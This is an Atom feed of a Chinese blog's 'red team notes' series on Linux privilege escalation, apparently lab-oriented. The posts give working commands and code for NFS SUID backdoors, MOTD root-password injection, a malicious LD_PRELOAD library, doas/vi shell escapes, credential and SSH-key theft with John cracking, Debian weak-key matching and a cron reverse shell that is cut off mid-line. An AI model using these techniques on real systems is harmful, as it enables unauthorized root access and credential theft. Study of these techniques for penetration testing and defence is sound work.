<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>s0m1ng</title>
  
  <subtitle>二进制学习中</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2026-03-18T12:00:02.935Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>s0m1ng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux提权9：sudo风暴_上 (红队笔记)</title>
    <link href="http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%839_sudo%E9%A3%8E%E6%9A%B4_%E4%B8%8A/"/>
    <id>http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%839_sudo%E9%A3%8E%E6%9A%B4_%E4%B8%8A/</id>
    <published>2026-03-20T06:00:00.000Z</published>
    <updated>2026-03-18T12:00:02.935Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>用sudo -l 看哪些命令可以不输入密码就可以用sudo</p><p>之后去GTFOBins 一个个查现成的payload就行了，不过这里的内容是打提权基础不可或缺的部分，如果以后想成为提权大师这里的payload是有必要好好学习一下的</p><p>不过鉴于我没时间写了，等以后有时间再写吧，绝对不是因为懒）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;用sudo -l 看哪些命令可以不输入密码就可以用sudo&lt;/p&gt;
&lt;p&gt;之后去GTFOBins 一个个查现成的payload就行了</summary>
      
    
    
    
    <category term="ISW" scheme="http://example.com/categories/ISW/"/>
    
    <category term="Linux提权" scheme="http://example.com/categories/ISW/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="http://example.com/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="sudo基础" scheme="http://example.com/tags/sudo%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权8：系统服务与底层内核漏洞 (红队笔记)</title>
    <link href="http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%838_%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%8E%E5%BA%95%E5%B1%82%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%838_%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%8E%E5%BA%95%E5%B1%82%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/</id>
    <published>2026-03-20T03:00:00.000Z</published>
    <updated>2026-03-18T10:49:37.965Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>这是红队笔记提权精讲中的第六部分，也是最后一部分</p><p>本章进入提权的“深水区”。我们将探讨如何利用系统底层服务的配置失误，以及如何使用公开的 CVE 漏洞代码直接攻击 Linux 内核。</p><h1 id="实战："><a href="#实战：" class="headerlink" title="实战："></a>实战：</h1><h2 id="情况一：NFS-共享提权-Net-file-system"><a href="#情况一：NFS-共享提权-Net-file-system" class="headerlink" title="情况一：NFS 共享提权 (Net file system)"></a>情况一：NFS 共享提权 (Net file system)</h2><p><strong>利用场景</strong>：目标机器开启了 NFS (网络文件系统) 服务，且配置了极度危险的选项 <code>no_root_squash</code>。</p><p><strong>原理</strong>：默认情况下，NFS 客户端的 root 用户连接服务端时会被降权（Squash）为普通用户。但如果开启了 <code>no_root_squash</code>，<strong>客户端的 root 用户在挂载的共享目录中将拥有服务端的 root 权限</strong>。</p><p><strong>提权逻辑</strong>：在我的 <strong>攻击机</strong> 上以 root 身份挂载你的共享目录 -&gt; 把我 <strong>攻击机</strong> 的 <code>/bin/bash</code> 拷贝进去并赋予 SUID -&gt; 靶机本地运行该 bash。</p><p><strong>实战步骤：</strong></p><ol><li><strong>探测 NFS 配置</strong>：在靶机查看 <code>/etc/exports</code>，如果看到 <code>no_root_squash</code> 字样：例如 <code>/tmp *(rw,sync,no_root_squash,no_subtree_check)</code>就说明可以打NFS<br><img data-src="/images/ISW/Linux提权/8/NFS.png" alt="NFS"></li></ol><ol><li><p><strong>在攻击机挂载共享目录</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先切换到root用户</span></span><br><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line"><span class="built_in">mkdir</span> /tmp/nfs</span><br><span class="line">mount -o rw,vers=3 目标IP:/tmp /tmp/nfs</span><br></pre></td></tr></table></figure></li><li><p><strong>植入 SUID 后门</strong>：在攻击机上，将自己的恶意文件拷贝进去，并以 root 身份赋权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/exec CMD=<span class="string">&quot;/bin/bash -p&quot;</span> -f elf -o /tmp/nfs/shell.elf</span><br><span class="line"><span class="built_in">chmod</span> +xs /tmp/nfs/shell.elf</span><br></pre></td></tr></table></figure></li><li><p><strong>回到靶机触发</strong>：进入靶机的 <code>/tmp</code> 目录，运行刚刚植入的后门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure></li></ol><h2 id="情况二：利用-MOTD-机制提权"><a href="#情况二：利用-MOTD-机制提权" class="headerlink" title="情况二：利用 MOTD 机制提权"></a>情况二：利用 MOTD 机制提权</h2><p><strong>利用场景</strong>：MOTD (Message of The Day) 登录横幅脚本配置不当。</p><p><strong>实战操作</strong>：</p><ol><li><p><strong>寻找可写脚本</strong>：<code>find /etc/update-motd.d/ -writable</code></p></li><li><p><strong>注入命令</strong>：<code>echo &quot;echo &#39;root:password123&#39; | chpasswd&quot; &gt;&gt; /etc/update-motd.d/00-header</code></p></li><li><p><strong>触发执行</strong>：再次通过 SSH 登录，脚本运行后 <code>su root</code> 即可。</p></li></ol><h2 id="情况三：底层内核漏洞提权-Kernel-Exploit"><a href="#情况三：底层内核漏洞提权-Kernel-Exploit" class="headerlink" title="情况三：底层内核漏洞提权 (Kernel Exploit)"></a>情况三：底层内核漏洞提权 (Kernel Exploit)</h2><p>当上述所有配置枚举都失败，且 <code>uname -a</code> 显示内核版本存在已知 CVE 漏洞时使用。</p><p>配合<strong>linux_exploit_suggester/linpeas</strong> + <strong>searchsploit</strong>来打</p><h3 id="常用的漏洞"><a href="#常用的漏洞" class="headerlink" title="常用的漏洞"></a>常用的漏洞</h3><ol><li><p><strong>Dirty COW (脏牛, CVE-2016-5195)</strong>：针对 2.6.22 &lt; 4.8.3。</p></li><li><p><strong>PwnKit (CVE-2021-4034)</strong>：针对 <code>pkexec</code> 工具，稳定性极高。</p></li><li><p><strong>Dirty Pipe (脏管, CVE-2022-0847)</strong>：针对 5.8+ 内核。</p></li></ol><p>用法都在对应脚本里会给出</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;这是红队笔记提权精讲中的第六部分，也是最后一部分&lt;/p&gt;
&lt;p&gt;本章进入提权的“深水区”。我们将探讨如何利用系统底层服务的配置失误，</summary>
      
    
    
    
    <category term="ISW" scheme="http://example.com/categories/ISW/"/>
    
    <category term="Linux提权" scheme="http://example.com/categories/ISW/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="http://example.com/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="经典方法" scheme="http://example.com/tags/%E7%BB%8F%E5%85%B8%E6%96%B9%E6%B3%95/"/>
    
    <category term="内核漏洞" scheme="http://example.com/tags/%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权7：信息泄露与敏感凭据 (红队笔记)</title>
    <link href="http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%837_%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E6%95%8F%E6%84%9F%E5%87%AD%E6%8D%AE/"/>
    <id>http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%837_%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E6%95%8F%E6%84%9F%E5%87%AD%E6%8D%AE/</id>
    <published>2026-03-20T02:00:00.000Z</published>
    <updated>2026-03-18T12:03:03.531Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>这是红队笔记第五部分：信息泄露与敏感凭据</p><p><strong>核心逻辑</strong>：系统本身可能固若金汤，但“人”是会犯错的。管理员可能会为了方便而直接在命令行输密码，或者把备份文件随手乱扔。</p><p>这一章我们专注于如何通过“枚举”和“翻找”来拿到通往 root 的钥匙。</p><h1 id="实战："><a href="#实战：" class="headerlink" title="实战："></a>实战：</h1><h2 id="情况一：历史记录文件泄露提权-Bash-History"><a href="#情况一：历史记录文件泄露提权-Bash-History" class="headerlink" title="情况一：历史记录文件泄露提权 (Bash History)"></a>情况一：历史记录文件泄露提权 (Bash History)</h2><p><strong>利用场景</strong>：管理员在维护系统时，有时会偷懒直接在命令行里带上密码，或者在尝试登录数据库、远程服务器时输入了错误的命令。</p><p><strong>实战操作</strong>：拿到 Shell 后，第一时间检查当前用户及其他可读目录下的历史记录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> <span class="comment"># 列出命令</span></span><br><span class="line"><span class="built_in">cat</span> ~/.bash_history</span><br><span class="line"><span class="built_in">cat</span> ~/.nano_history</span><br><span class="line"><span class="built_in">cat</span> ~/.viminfo</span><br></pre></td></tr></table></figure><ul><li><p><strong>重点搜索关键词</strong>： <code>grep -E &quot;password|pass|pwd|admin|mysql|ssh&quot; ~/.bash_history</code></p></li><li><p><strong>实例</strong>：你可能会发现这样一行：<code>mysql -u root -pMySecretPassword123</code>。你就拿到了数据库甚至可能是系统通用的 root 密码。</p></li></ul><h2 id="情况二：配置文件与备份文件提权"><a href="#情况二：配置文件与备份文件提权" class="headerlink" title="情况二：配置文件与备份文件提权"></a>情况二：配置文件与备份文件提权</h2><p><strong>利用场景</strong>：Web 网站（如 WordPress）的数据库连接文件、系统的备份压缩包（<code>.bak</code>, <code>.zip</code>, <code>.tar.gz</code>）经常包含明文凭据。</p><p><img data-src="/images/ISW/Linux提权/7/vpn.png" alt="vpn"></p><p>这里就是查看了vpn的配置文件找到关键信息</p><p>其余我们还可以通过下面方式去寻找:</p><ul><li>检查 Web 目录：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -i <span class="string">&quot;password&quot;</span> /var/www/html/config.php</span><br><span class="line">grep -i <span class="string">&quot;db_pass&quot;</span> /var/www/html/wp-config.php</span><br></pre></td></tr></table></figure><ul><li><strong>检查系统日志</strong>：有些程序员会将调试信息（包含密码）直接打入 <code>/var/log/</code> 下的自定义日志中。</li></ul><h2 id="情况三：SSH-私钥敏感信息提权"><a href="#情况三：SSH-私钥敏感信息提权" class="headerlink" title="情况三：SSH 私钥敏感信息提权"></a>情况三：SSH 私钥敏感信息提权</h2><p><strong>利用场景</strong>：你在某个用户的家目录下发现了一个隐藏文件夹 <code>.ssh</code>，并且里面竟然有一个 <code>id_rsa</code>（私钥）文件且<strong>你居然有读权限</strong>。</p><p>通常是rsa的私钥，读完之后尝试以root连接靶机</p><p><code>ssh -i id_rsa root@目标IP</code></p><p><img data-src="/images/ISW/Linux提权/7/ssh.png" alt="ssh"></p><p><strong>注意</strong>：很多时候你拿到了 <code>id_rsa</code>，但尝试登录时系统提示 <code>Enter passphrase for key &#39;id_rsa&#39;:</code>。这时需要用到 <code>ssh2john</code>。</p><ol><li><p><strong>将私钥转为 Hash</strong>：在你的 Kali 机器上执行（<code>ssh2john</code> 脚本通常位于 <code>/usr/share/john/</code> 下）</p></li><li><p><strong>使用 John 进行破解</strong></p></li><li><p><strong>获取明文并登录</strong>：John 跑出明文密码后，使用该密码配合私钥登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py id_rsa &gt; ssh_hash.txt</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt</span><br><span class="line"><span class="built_in">chmod</span> 600 id_rsa</span><br><span class="line">ssh -i id_rsa root@目标IP</span><br></pre></td></tr></table></figure></li></ol><h2 id="情况四：可预测-PRNG-暴力破解-SSH-Debian-特色"><a href="#情况四：可预测-PRNG-暴力破解-SSH-Debian-特色" class="headerlink" title="情况四：可预测 PRNG 暴力破解 SSH (Debian 特色)"></a>情况四：可预测 PRNG 暴力破解 SSH (Debian 特色)</h2><p><strong>PRNG</strong> 全称是 <strong>Pseudo-Random Number Generator</strong>（伪随机数生成器）。</p><p><strong>利用场景</strong>：CVE-2008-0166。针对老旧 Debian/Ubuntu 系统，由于随机数种子空间太小，导致生成的 SSH 密钥一共只有 32,768 种可能。所以拿到一个公钥用穷举法就能拿到相对应的私钥</p><h3 id="判断能不能打："><a href="#判断能不能打：" class="headerlink" title="判断能不能打："></a>判断能不能打：</h3><p><strong>1.检查操作系统版本</strong></p><p>该漏洞主要影响 <strong>2006 年至 2008 年</strong> 间发布的系统：</p><ul><li><p><strong>Ubuntu</strong>: 7.04, 7.10, 8.04</p></li><li><p><strong>Debian</strong>: 4.0 (Etch)</p></li><li><p><strong>命令</strong>：<code>cat /etc/issue</code> 或 <code>lsb_release -a</code></p></li></ul><p><strong>2.检查 OpenSSL 版本</strong></p><p>受影响的 OpenSSL 版本区间非常固定：</p><ul><li><p><strong>版本号</strong>：<code>0.9.8c-1</code> 到 <code>0.9.8g-9</code></p></li><li><p><strong>命令</strong>：<code>openssl version</code></p></li></ul><h3 id="具体打法："><a href="#具体打法：" class="headerlink" title="具体打法："></a>具体打法：</h3><ol><li><p>去拿用户的公钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></li><li><p>下载公钥私钥库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 创建专用目录</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /usr/share/wordlists/debian-ssh</span><br><span class="line"><span class="comment"># 2. 解压到该目录 </span></span><br><span class="line"><span class="built_in">sudo</span> tar -jxvf debian_ssh_rsa_2048_x86.tar.bz2 -C /usr/share/wordlists/debian-ssh/</span><br></pre></td></tr></table></figure></li><li><p><strong>寻找匹配的用户私钥</strong>：在你的字典目录里，使用 <code>grep</code> 搜索目标公钥的指纹或部分字符串：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -lr <span class="string">&quot;目标公钥字符串&quot;</span> /usr/share/wordlists/debian-ssh/</span><br><span class="line"><span class="comment"># 如果搜到了，那个对应的文件名（去掉 .pub 后缀）就是对应的私钥</span></span><br></pre></td></tr></table></figure></li><li><p>搜到私钥就登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 600 /usr/share/wordlists/debian-ssh/某个私钥文件名</span><br><span class="line">ssh -i /usr/share/wordlists/debian-ssh/某个私钥文件名 root@目标IP</span><br></pre></td></tr></table></figure></li></ol><p>具体可以searchsploit prng随便找个脚本看具体步骤</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;这是红队笔记第五部分：信息泄露与敏感凭据&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心逻辑&lt;/strong&gt;：系统本身可能固若金汤，但“人”是</summary>
      
    
    
    
    <category term="ISW" scheme="http://example.com/categories/ISW/"/>
    
    <category term="Linux提权" scheme="http://example.com/categories/ISW/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="http://example.com/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="经典方法" scheme="http://example.com/tags/%E7%BB%8F%E5%85%B8%E6%96%B9%E6%B3%95/"/>
    
    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权6：特权委派漏洞sudo/Doas (红队笔记)</title>
    <link href="http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%836_%E7%89%B9%E6%9D%83%E5%A7%94%E6%B4%BE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%836_%E7%89%B9%E6%9D%83%E5%A7%94%E6%B4%BE%E6%BC%8F%E6%B4%9E/</id>
    <published>2026-03-20T01:00:00.000Z</published>
    <updated>2026-03-18T11:01:16.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>本篇讲的是第四类 ：特权委派漏洞sudo/Doas</p><p>在 Linux 系统中，<code>root</code> 权限不能随便给别人。为了方便管理，系统管理员通常会使用特权委派工具（如 <code>sudo</code> 或 <code>doas</code>），允许普通用户在<strong>不输入 root 密码</strong>的情况下，以 root 身份执行<strong>特定的几条命令</strong>。</p><p>但这往往是漏洞的重灾区，如果管理员规则写得太宽泛，或者对环境变量管控不严，我们就能借力打力，直接“逃逸”出规则的限制，拿到完整的 Root Shell。</p><h1 id="实战："><a href="#实战：" class="headerlink" title="实战："></a>实战：</h1><h2 id="情况一：Sudo-环境变量提权-LD-PRELOAD-劫持"><a href="#情况一：Sudo-环境变量提权-LD-PRELOAD-劫持" class="headerlink" title="情况一：Sudo 环境变量提权 (LD_PRELOAD 劫持)"></a>情况一：Sudo 环境变量提权 (<code>LD_PRELOAD</code> 劫持)</h2><p>拿到低权限shell后打一个sudo -l看看情况</p><p><img data-src="/images/ISW/Linux提权/6/sudo.png" alt="sudo"></p><p>输入后，如果输出中包含下面这行极其危险的环境变量配置： <code>env_keep += LD_PRELOAD</code> 并且下面列出了你可以免密执行的某个命令（比如 <code>(root) NOPASSWD: /usr/bin/find</code>） 那就可以按我们这个套路来打</p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理：</strong></h3><p> <code>LD_PRELOAD</code>其中 LD是linker dynamic的缩写。它的作用是：<strong>在程序加载任何正常的 C 语言标准库之前，优先加载你指定的动态链接库 (<code>.so</code> 文件)，</strong>如果 <code>sudo</code> 配置了 <code>env_keep += LD_PRELOAD</code>，意味着当你用 <code>sudo</code> 运行命令时，这个环境变量会被<strong>带入到 root 环境中</strong>。</p><p>黑客逻辑：我写一个恶意的 <code>.so</code> 库 -&gt; 用 <code>LD_PRELOAD</code> 加载它 -&gt; 用 <code>sudo</code> 随便跑一个合法的命令 -&gt; 恶意代码被以 root 权限优先执行</p><h3 id="实现："><a href="#实现：" class="headerlink" title="实现："></a>实现：</h3><ol><li><p><strong>编写恶意 C 语言库文件</strong> 去靶机的 <code>/tmp</code> 目录，新建一个名为 <code>preload.c</code> 的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">// _init() 函数会在共享库被加载时自动优先执行</span><br><span class="line">void <span class="function"><span class="title">_init</span></span>() &#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>); // 防止死循环</span><br><span class="line">    setgid(0);</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>编译为动态链接库 (<code>.so</code>)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles</span><br></pre></td></tr></table></figure></li><li><p><strong>拿Root</strong> 假设 <code>sudo -l</code> 允许我们运行的命令是 <code>/usr/bin/find</code>。我们在运行它的同时，强行塞入我们的恶意库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> LD_PRELOAD=/tmp/preload.so /usr/bin/find</span><br></pre></td></tr></table></figure></li></ol><p>补充：同理，如果你在 <code>sudo -l</code> 看到 <code>env_keep += LD_LIBRARY_PATH</code>，也是一模一样的劫持思路，只需替换程序原本调用的同名 <code>.so</code> 即可。</p><h2 id="情况二：doas-交互式程序逃逸提权-less-vi"><a href="#情况二：doas-交互式程序逃逸提权-less-vi" class="headerlink" title="情况二：doas 交互式程序逃逸提权 (less / vi)"></a>情况二：<code>doas</code> 交互式程序逃逸提权 (<code>less</code> / <code>vi</code>)</h2><h3 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h3><p><strong>什么是 Doas？</strong> <code>doas</code> 最初是 OpenBSD 系统里的工具，后来被移植到了 Linux。它的作用和 <code>sudo</code> 一模一样，但主打一个<strong>轻量、极简</strong>。在很多加固过的靶机（如 Alpine Linux）中，管理员会用 <code>doas</code> 替代 <code>sudo</code>。</p><p><strong>利用场景：</strong> 首先，查看 <code>doas</code> 的配置文件（它的配置比 sudoers 简单多了，且通常全局可读）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/doas.conf</span><br></pre></td></tr></table></figure><p>如果你在里面看到类似这样的规则： <code>permit nopass s0m1ng as root cmd less</code> 或者 <code>permit nopass s0m1ng as root cmd vi</code> </p><p>意思是你被允许以 root 身份运行 <code>less</code> 或 <code>vi</code>。那我们就可以尝试打一下</p><p><strong>原理解析 (交互式逃逸)：</strong> <code>less</code>、<code>more</code>、<code>vi</code>、<code>man</code> 这一类程序被称为<strong>交互式阅读器/编辑器</strong>。它们为了方便程序员，内部自带了“不退出阅读器，直接执行系统命令”的快捷键（通常是 <code>!</code> 感叹号）。既然我们是借助 <code>doas</code> 以 root 身份运行它们的，那它们内部弹出的 Shell，自然也是 root 权限</p><h3 id="实战操作步骤"><a href="#实战操作步骤" class="headerlink" title="实战操作步骤"></a>实战操作步骤</h3><ol><li><strong>目标命令是 <code>less</code> (或 <code>more</code>, <code>man</code>)</strong></li></ol><p>以高权限运行它去读一个大文件（保证文件够长，能进入分页交互模式）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">doas less /etc/shadow</span><br><span class="line">!/bin/sh</span><br><span class="line"><span class="comment">#然后按回车</span></span><br></pre></td></tr></table></figure><ol><li><strong>目标命令是 <code>vi</code> (或 <code>vim</code>)</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doas vi /etc/profile</span><br></pre></td></tr></table></figure><p>在编辑器内，按下 <code>ESC</code> 键，输入冒号进入命令模式，然后敲下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!/bin/sh</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;本篇讲的是第四类 ：特权委派漏洞sudo/Doas&lt;/p&gt;
&lt;p&gt;在 Linux 系统中，&lt;code&gt;root&lt;/code&gt; 权限不</summary>
      
    
    
    
    <category term="ISW" scheme="http://example.com/categories/ISW/"/>
    
    <category term="Linux提权" scheme="http://example.com/categories/ISW/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="http://example.com/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="经典方法" scheme="http://example.com/tags/%E7%BB%8F%E5%85%B8%E6%96%B9%E6%B3%95/"/>
    
    <category term="sudo" scheme="http://example.com/tags/sudo/"/>
    
    <category term="Doas" scheme="http://example.com/tags/Doas/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权5：计划任务漏洞 (红队笔记)</title>
    <link href="http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%835_%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%20(Cron)%20%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%835_%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%20(Cron)%20%E6%BC%8F%E6%B4%9E/</id>
    <published>2026-03-20T00:00:00.000Z</published>
    <updated>2026-03-18T08:07:46.729Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>本篇讲的是第三类：计划任务漏洞提权方法</p><h1 id="基础知识及提权原理："><a href="#基础知识及提权原理：" class="headerlink" title="基础知识及提权原理："></a>基础知识及提权原理：</h1><p>在 Linux 系统中，<code>cron</code> 是一个用来定期执行任务的后台守护进程（类似 Windows 的“任务计划程序”）。系统管理员经常用它来做定时备份、定时清理日志等工作。</p><p><strong>漏洞点：</strong> 如果一个计划任务是<strong>以 <code>root</code> 身份运行的</strong>，且它调用的脚本或运行环境能够被我们（低权限用户）控制，我们就可以把恶意代码塞进去。等时间一到，系统就会用 root 权限帮我们执行恶意代码</p><h2 id="如何发现计划任务？"><a href="#如何发现计划任务？" class="headerlink" title="如何发现计划任务？"></a>如何发现计划任务？</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>注意看文件里的内容，如果有任务的执行者是 <code>root</code>,我们就要重点关注它</p><p>然后我们可以locate定位这个脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate overwrite.sh</span><br></pre></td></tr></table></figure><h1 id="实战："><a href="#实战：" class="headerlink" title="实战："></a>实战：</h1><h2 id="情况一：自动任务文件权限提权-root运行脚本可写"><a href="#情况一：自动任务文件权限提权-root运行脚本可写" class="headerlink" title="情况一：自动任务文件权限提权 (root运行脚本可写)"></a>情况一：自动任务文件权限提权 (root运行脚本可写)</h2><p><img data-src="/images/ISW/Linux提权/5/corn.png" alt="corn"></p><p>这里root运行的overwrite.sh可读可写，直接打</p><p>我们需要注意</p><p>这里我们可以有两种攻击方法：一种是反弹shell，一种是写文件再获得shell</p><h3 id="反弹shell："><a href="#反弹shell：" class="headerlink" title="反弹shell："></a>反弹shell：</h3><ol><li><p>改写overwrite.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i 